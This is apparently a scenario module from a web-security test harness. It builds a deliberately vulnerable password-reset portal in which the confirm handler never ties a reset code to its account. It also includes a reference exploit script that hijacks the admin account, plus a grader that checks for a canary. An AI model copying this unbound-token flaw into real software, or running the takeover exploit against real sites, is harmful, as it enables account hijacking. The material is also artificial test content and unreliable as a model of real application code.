// WSTG-ATHN-09 (4.4.9) — Weak Password Reset behaviour.
// In-memory portal (no DB). State: users, reset tokens, sessions. A logged-in
// user generates a reset code for their OWN account (self-scoped, legitimate).
// The reset-confirm handler checks the code is valid + unexpired but NEVER
// checks token.issuedFor === the account being reset — so any valid code resets
// ANY account. Attacker registers, gets their own code, and resets the admin.

import crypto from 'node:crypto'
import { Scenario } from './scenario.mjs'

const SUFFIXES = ['', '/login', '/register', '/reset', '/reset/confirm']
const TOKEN_TTL_MS = 60 * 60 * 1000

let STATE = null
function state(scenario, canary) {
  if (!STATE) {
    STATE = { users: new Map(), tokens: new Map(), sessions: new Map() }
    // Seed the admin with an unknown strong password; its secret is the canary.
    STATE.users.set(scenario.adminUsername, {
      password: crypto.randomBytes(16).toString('hex'),
      isAdmin: true,
      secret: canary,
    })
  }
  return STATE
}

const newSid = () => 's_' + crypto.randomBytes(16).toString('hex')
const newToken = () => 'rt_' + crypto.randomBytes(12).toString('hex')

export const classDef = {
  wstgId: 'WSTG-ATHN-09',
  class: 'Weak Password Reset',
  defenceTiers: [0],
  Scenario,
  needsSignup: false,
  canaryRuntime: true,
  discoveryMode: 'observation',
  discoveryTargetPath: (s) => s.basePath + '/login',
  discoveryStaticOk: (s) =>
    typeof s.chromeInjection?.html === 'string' &&
    (s.chromeInjection.html.includes(s.basePath + '/login') || s.chromeInjection.html.includes(s.basePath)),

  matchesRequest({ reqUrl, scenario }) {
    const base = scenario.basePath
    if (reqUrl.pathname === base) return true
    if (!reqUrl.pathname.startsWith(base + '/')) return false
    return SUFFIXES.includes(reqUrl.pathname.slice(base.length))
  },

  async handleRequest({ req, reqUrl, scenario, session, helpers, renderPage, manifest }) {
    const base = scenario.basePath
    const suffix = reqUrl.pathname === base ? '' : reqUrl.pathname.slice(base.length)
    const st = state(scenario, manifest.perDeployCanary)
    const currentUser = session ? st.sessions.get(session) : null
    const form = () => new URLSearchParams(helpers.rawBody || '')
    const page = (inner) => ({ status: 200, body: renderPage(inner) })
    const redirect = (to, setCookie) => ({
      status: 302,
      headers: { Location: to, ...(setCookie ? { 'Set-Cookie': setCookie } : {}) },
      body: '',
    })

    // ── Register ──
    if (suffix === '/register') {
      if (req.method === 'POST') {
        const f = form()
        const u = (f.get('username') || '').trim()
        const p = f.get('password') || ''
        if (!u || !p) return page(registerForm(base, 'Username and password are required.'))
        if (st.users.has(u)) return page(registerForm(base, 'That username is already taken.'))
        st.users.set(u, { password: p, isAdmin: false, secret: null })
        const sid = newSid()
        st.sessions.set(sid, u)
        return redirect(base, `session=${sid}; Path=/; HttpOnly; SameSite=Lax`)
      }
      return page(registerForm(base))
    }

    // ── Login ──
    if (suffix === '/login') {
      if (req.method === 'POST') {
        const f = form()
        const u = (f.get('username') || '').trim()
        const p = f.get('password') || ''
        const rec = st.users.get(u)
        if (!rec || rec.password !== p) return page(loginForm(base, 'Invalid username or password.'))
        const sid = newSid()
        st.sessions.set(sid, u)
        return redirect(base, `session=${sid}; Path=/; HttpOnly; SameSite=Lax`)
      }
      return page(loginForm(base))
    }

    // ── Reset request (authenticated, self-scoped) ──
    if (suffix === '/reset') {
      if (!currentUser) return page(loginForm(base, 'Please sign in to manage your account.'))
      if (req.method !== 'POST') return { status: 405, body: renderPage('<p>Method not allowed.</p>') }
      const token = newToken()
      st.tokens.set(token, { issuedFor: currentUser, expiresAt: Date.now() + TOKEN_TTL_MS })
      return page(resetIssuedView(base, currentUser, token))
    }

    // ── Reset confirm — THE FLAW ──
    if (suffix === '/reset/confirm') {
      if (req.method !== 'POST') return { status: 405, body: renderPage('<p>Method not allowed.</p>') }
      const f = form()
      const token = f.get('token') || ''
      const username = (f.get('username') || '').trim()
      const newPassword = f.get('new_password') || ''
      const t = st.tokens.get(token)
      if (!t || t.expiresAt < Date.now()) {
        return page(resetResult(base, 'That reset code is invalid or has expired.'))
      }
      if (!newPassword) return page(resetResult(base, 'A new password is required.'))
      // VULNERABLE: the code is verified as a real, unexpired token, but the
      // handler never checks t.issuedFor === username. Any valid code resets
      // ANY account — so a self-issued code takes over the admin.
      const rec = st.users.get(username)
      st.tokens.delete(token)
      if (!rec) {
        // Don't disclose which usernames exist — still report success.
        return page(resetResult(base, 'Your password has been updated. You can now sign in.'))
      }
      rec.password = newPassword
      return page(resetResult(base, `The password for ${escapeHtml(username)} has been updated. You can now sign in.`))
    }

    // ── Dashboard (base) ──
    if (!currentUser) return redirect(base + '/login')
    const rec = st.users.get(currentUser)
    if (rec?.isAdmin) {
      return page(scenario.accountAdminBody.replace('{CANARY}', rec.secret))
    }
    return page(scenario.accountMemberBody.replaceAll('{USER}', escapeHtml(currentUser)) + memberResetWidget(base))
  },

  // Reference exploit: register → self-issue a code → confirm it against the
  // admin (binding flaw) → log in as admin → read the dashboard canary.
  async fireExploit({ baseUrl, scenario, payload, helpers }) {
    const base = scenario.basePath
    let cookie = null
    const capture = (resp) => {
      const sc = resp.headers.get('set-cookie') || ''
      const m = sc.match(/session=([^;]+)/)
      if (m) cookie = `session=${m[1]}`
    }
    const post = (path, body) =>
      fetch(`${baseUrl}${path}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded', ...(cookie ? { Cookie: cookie } : {}) },
        body,
        redirect: 'manual',
      })

    const attacker = 'atk_' + crypto.randomBytes(4).toString('hex')
    const target = String(payload) // adminUsername
    const newPw = 'pwned_' + crypto.randomBytes(4).toString('hex')

    // 1. register the attacker (captures their session)
    capture(await post(`${base}/register`, `username=${encodeURIComponent(attacker)}&password=atkpass123`))
    // 2. self-issue a reset code (scoped to the attacker)
    const issued = await (await post(`${base}/reset`, '')).text()
    const token = (issued.match(/rt_[0-9a-f]{24}/) || [''])[0]
    // 3. confirm the code against the ADMIN account (binding flaw)
    await post(`${base}/reset/confirm`,
      `token=${encodeURIComponent(token)}&username=${encodeURIComponent(target)}&new_password=${encodeURIComponent(newPw)}`)
    // 4. log in as admin with the new password (fresh session)
    cookie = null
    capture(await post(`${base}/login`, `username=${encodeURIComponent(target)}&password=${encodeURIComponent(newPw)}`))
    // 5. read the admin dashboard
    return helpers.fetchWithCookie(`${baseUrl}${base}`, cookie)
  },

  exploitSuccessCriterion: ({ responseBody, perDeployCanary }) =>
    responseBody.includes(perDeployCanary),
}

// ── view helpers (fixed field names so the exploit is deterministic) ──
function loginForm(base, err) {
  return `<section style="max-width:420px;margin:0 auto">
  <h2 style="font-size:20px;margin:0 0 12px">Sign in</h2>
  ${err ? `<p role="alert" style="color:#b00;margin:0 0 12px">${escapeHtml(err)}</p>` : ''}
  <form method="POST" action="${base}/login" style="display:flex;flex-direction:column;gap:10px">
    <label>Username<input name="username" autocomplete="username" style="display:block;width:100%;padding:8px"></label>
    <label>Password<input name="password" type="password" autocomplete="current-password" style="display:block;width:100%;padding:8px"></label>
    <button type="submit" style="padding:9px 14px">Sign in</button>
  </form>
  <p style="margin-top:12px">No account? <a href="${base}/register">Create one</a>.</p>
</section>`
}
function registerForm(base, err) {
  return `<section style="max-width:420px;margin:0 auto">
  <h2 style="font-size:20px;margin:0 0 12px">Create your account</h2>
  ${err ? `<p role="alert" style="color:#b00;margin:0 0 12px">${escapeHtml(err)}</p>` : ''}
  <form method="POST" action="${base}/register" style="display:flex;flex-direction:column;gap:10px">
    <label>Username<input name="username" autocomplete="username" style="display:block;width:100%;padding:8px"></label>
    <label>Password<input name="password" type="password" autocomplete="new-password" style="display:block;width:100%;padding:8px"></label>
    <button type="submit" style="padding:9px 14px">Create account</button>
  </form>
  <p style="margin-top:12px">Already registered? <a href="${base}/login">Sign in</a>.</p>
</section>`
}
function memberResetWidget(base) {
  return `<section style="margin-top:24px;padding-top:16px;border-top:1px solid #e5e5e5">
  <h3 style="font-size:15px;margin:0 0 8px">Password &amp; security</h3>
  <p style="color:#666;margin:0 0 10px">Need to change your password? Generate a one-time reset code for your account.</p>
  <form method="POST" action="${base}/reset"><button type="submit" style="padding:8px 14px">Reset my password</button></form>
</section>`
}
function resetIssuedView(base, user, token) {
  return `<section style="max-width:480px;margin:0 auto">
  <h2 style="font-size:20px;margin:0 0 12px">Reset password</h2>
  <p>A one-time reset code has been generated for <strong>${escapeHtml(user)}</strong>:</p>
  <p><code style="font-size:15px;background:#f3f3f3;padding:4px 8px;border-radius:4px">${escapeHtml(token)}</code></p>
  <form method="POST" action="${base}/reset/confirm" style="display:flex;flex-direction:column;gap:10px;margin-top:14px">
    <input type="hidden" name="token" value="${escapeHtml(token)}">
    <label>Account<input name="username" value="${escapeHtml(user)}" style="display:block;width:100%;padding:8px"></label>
    <label>New password<input name="new_password" type="password" style="display:block;width:100%;padding:8px"></label>
    <button type="submit" style="padding:9px 14px">Set new password</button>
  </form>
</section>`
}
function resetResult(base, msg) {
  return `<section style="max-width:480px;margin:0 auto">
  <p>${escapeHtml(msg)}</p>
  <p style="margin-top:12px"><a href="${base}/login">Go to sign in</a></p>
</section>`
}
function escapeHtml(s) {
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;')
}
